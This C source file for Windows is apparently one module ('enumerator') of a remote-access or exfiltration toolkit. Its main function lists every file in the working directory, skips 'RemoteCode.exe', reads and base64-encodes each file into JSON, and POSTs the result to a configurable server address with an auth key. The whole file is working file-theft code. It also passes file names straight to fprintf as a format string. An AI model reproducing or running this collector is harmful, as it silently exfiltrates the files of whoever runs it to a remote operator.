#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>            // You must import this to interact with Windows API because Windows doesn't have <dirent.h> (fml)
#include <common.h>

// Define some macros for address and auth key
#ifndef SVL_ADDRESS
    #define SVL_ADDRESS "http://localhost"
#endif

#ifndef SVL_AUTHKEY
    #define SVL_AUTHKEY "NO AUTH KEY"
#endif

#pragma GCC diagnostic ignored "-Wimplicit-function-declaration"

/**
 * Given a directory, enumerate all the files there
 * @param directory A string representing the directory path (relative)
 * @param arr_size {Outbound} Pointer to variable to represent size of the array to be returned
 * @note Be very careful with the directory path in C. This matches FILES, not actual paths. (Basically, you will need "./*").
 * @return Array of file names (string array)
*/
char** enumerate_directory(char* directory, int* arr_size)
{
    
    // This tracks the current array size and the number of items that exists
    int num_items = 0;

    // String array that contains the file names
    char** file_arr = malloc(10 * sizeof(char*));

    // Temporarily declares a file_data variable
    WIN32_FIND_DATAA file_data; 

    // The windows API returns a handle (iterator, basically) to search through all the items.
    // Its parameters require a directory to search in, and a pointer (read: address) to the file_data to write data into.
    HANDLE search_handle = FindFirstFileA(directory, &file_data);

    if (search_handle == INVALID_HANDLE_VALUE)
    {
        puts("There are no files to enumerate");
    }
    else
    {
        // If there are files to enumerate, append the current data. Then continue looping until there are no more files left.
        do
        {
            // If statement prevents us from appending the "." and ".." we usually would expect from running $ls -a
            if (strcmp(file_data.cFileName, ".") != 0 && strcmp(file_data.cFileName, "..") != 0)
            {
                // If we exhaust all 10 items in the array, create another 10
                if (num_items % 10 == 0 && num_items > 0)
                {
                    file_arr = realloc(file_arr, (num_items + 10) * sizeof(char*));
                }

                // Allocate space for the new string and add it in
                file_arr[num_items] = malloc(sizeof(file_data.cFileName));
                strcpy(file_arr[num_items], file_data.cFileName);

                num_items++; // Increment num_items
            }

        } while (FindNextFileA(search_handle, &file_data) != 0);     // FindNextFile returns 0 when it fails

    }

    *arr_size = num_items;
    return file_arr;
}

/**
 * Read all the files given in $file_names, and outputs their content into write_path
 * @param file_names An array of file names to read
 * @param size The size of the file_names array
 * @param write_path File path to write to
*/
void spill_file_contents(char** file_names, int size, char* write_path)
{
    FILE* write_file = fopen(write_path, "ab");

    // First, let's make sure the file we're writing to actually exists
    if (write_file == NULL) 
    { 
        puts("Write file path does not exist.");
        return;
    }

    // Now, we iterate through all the files
    for (int i = 0; i < size; i++)
    {
        FILE* read_file = fopen(file_names[i], "rb");

        // Let's actually make sure the file exists. If it doesn't, continue.
        if (read_file == NULL)
        {
            continue;
        }

        fprintf(write_file, file_names[i]);
        fprintf(write_file, "\n--------\n");

        // Read the file, and output its contents into write_file. Remember we are dynamically allocating this string.
        // Realistically, we won't need *this* much memory. This size is the "worst case scenario"
        long file_contents_size = get_file_size(read_file);
        char* file_contents = malloc(file_contents_size);

        // fread does read in binary mode, but ASCII values will still be displayed normally in the end
        // We aren't using fscanf/fprintf since those don't do it in binary
        fread(file_contents, file_contents_size, 1, read_file);
        fwrite(file_contents, file_contents_size, 1, write_file);

        fprintf(write_file, "\n\n");

        // Stop them memory leaks 😤
        free(file_contents);
    }
}

/**
 * Prints a string (including null bytes!) up to $size size
 * @param str String to print
 * @param size Size of String. Must be >= 0
 * @param show_null Show null bytes as "\0" instead of concealing it
*/
void print_mem(char* str, int size, boolean show_null)
{
    if (size < 0)
    {
        return;
    }

    for (int i = 0; i < size; i++)
    {
        if (str[i] == '\0' && show_null)
        {
            printf("\\0");
        }
        else
        {
            printf("%c", str[i]);
        }
    }

    // Stdout is buffered
    fflush(stdout);
    puts("");
}

/**
 * Read all the files given in $file_names, and outputs their content in JSON
 * @param file_names An array of file names to read
 * @param size The size of the file_names array
 * @param json_length {Outbound} Pointer that will output length of the JSON string
 * @note By calling this function, you must deallocate json_string
 * @return JSON string
*/
char* spill_file_json(char** file_names, int size, int* json_length)
{
    // Create our JSON string. Let's add a size object to determine the number of items in it.
    int json_size = 1;          // Start with 1 to take into account null terminator
    char* json_string = malloc(json_size);
    strcpy(json_string, "");

    // Add { to beginning of JSON. To do that, we will need to allocate 1 byte.
    json_size++;
    json_string = realloc(json_string, json_size);
    strcat(json_string, "{");

    // First, let's iterate through the files.
    for (int i = 0; i < size; i++)
    {
        FILE* read_file = fopen(file_names[i], "rb");

        // Let's actually make sure the file exists. If it doesn't, continue.
        // Also, prevent RemoteCode.exe from being read
        if (read_file == NULL || strcmp(file_names[i], "RemoteCode.exe") == 0)
        {
            continue;
        }

        // Add "{File Name\0}": to the JSON string.
        // Our json_size has to be decreased by 1 for injection_idx since we want to overwrite the source null terminator
        // Likewise, we're copying an extra "byte" since that's the null terminator
        concat_mem(&json_string, json_size - 1, "\"", 2, &json_size);
        concat_str_mem(&json_string, json_size - 1, file_names[i], strlen(file_names[i]) + 1, &json_size);
        concat_mem(&json_string, json_size - 1, "\":", 3, &json_size);

        // Read the file, and put the needed items into the JSON string. Basically, we want "{File Content}",

        // Remember, we are still dynamically allocating this. Hence, we will need the file size (read: number of chars in file)
        // First, let's get the original file text
        long file_contents_size = get_file_size(read_file);
        char* file_contents = malloc(file_contents_size + 1);       // We will transfer this over via strcat
        fread(file_contents, file_contents_size, 1, read_file);
        file_contents[file_contents_size] = '\0';                   // C doesn't automatically add null terminators to the end of fread, so we should do it manually ourselves

        // Transferring binary data over JSON is a bit of a pain. Hence, we will encode it in base64
        // The base64 function requires us to preallocate the base64 string size
        int b64_size = base64_size(file_contents_size);
        char* base64_str = malloc(b64_size + 1);            // Add 1 byte for \0
        base64(file_contents, file_contents_size, base64_str);
        base64_str[b64_size] = '\0';

        // Actually write the string here
        concat_mem(&json_string, json_size - 1, "\"", 2, &json_size);
        concat_str_mem(&json_string, json_size - 1, base64_str, b64_size + 1, &json_size);   // Base64 size does not take into account \0, so we add 1
        concat_mem(&json_string, json_size - 1, "\",", 3, &json_size);

        // Garbage collector
        free(file_contents);
        free(base64_str);
    }

    // Close the JSON at the end - and overwrite the last comma with }. The null byte can stay intact - no need to copy that over.
    concat_mem(&json_string, (json_size - 1) - 1, "}", 1, &json_size);
    *json_length = json_size;
    return json_string;
}

int main()
{
    int size;
    char** dir_names = enumerate_directory("./*", &size);

    int json_length;
    char* json_str = spill_file_json(dir_names, size, &json_length);
    // print_mem(json_str, json_length, TRUE);

    // Send it to the server
    send_post_request(SVL_ADDRESS, json_str, json_length, "enumerator", SVL_AUTHKEY);

    dealloc_str_arr(dir_names, size);
    free(json_str);

    return 0;
}